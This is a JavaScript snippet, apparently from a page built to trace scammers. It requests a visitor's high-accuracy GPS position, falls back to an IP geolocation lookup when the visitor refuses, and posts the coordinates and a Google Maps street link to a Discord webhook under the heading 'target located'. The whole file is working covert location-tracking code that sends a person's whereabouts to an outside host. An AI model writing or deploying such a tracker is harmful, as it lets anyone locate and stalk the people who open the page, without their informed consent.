async function gatherData() {
    // 1. Demande de position GPS prÃ©cise
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            // PrÃ©paration du message avec coordonnÃ©es exactes
            const gpsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            await sendToDiscord(gpsLink, `PrÃ©cision: ${accuracy} mÃ¨tres`, lat, lon);
        }, async (error) => {
            // Si l'arnaqueur refuse le GPS, on prend quand mÃªme son IP
            console.log("GPS RefusÃ©, passage Ã  l'IP...");
            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
            await sendToDiscord("GPS RefusÃ©", "BasÃ© sur IP", ipData.latitude, ipData.longitude);
        }, { enableHighAccuracy: true, timeout: 5000 });
    }
}

async function sendToDiscord(mapLink, details, lat, lon) {
    const payload = {
        embeds: [{
            title: "ğŸ¯ CIBLE LOCALISÃ‰E - PRÃ‰CISION GPS",
            color: 15158332,
            fields: [
                { name: "ğŸ“ Google Maps", value: `[Cliquer ici pour voir la rue](${mapLink})` },
                { name: "ğŸ“Š DÃ©tails", value: details, inline: true },
                { name: "ğŸŒ CoordonnÃ©es", value: `${lat}, ${lon}`, inline: true }
            ],
            footer: { text: "SystÃ¨me de TraÃ§age OSINT v2.5" }
        }]
    };

    await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

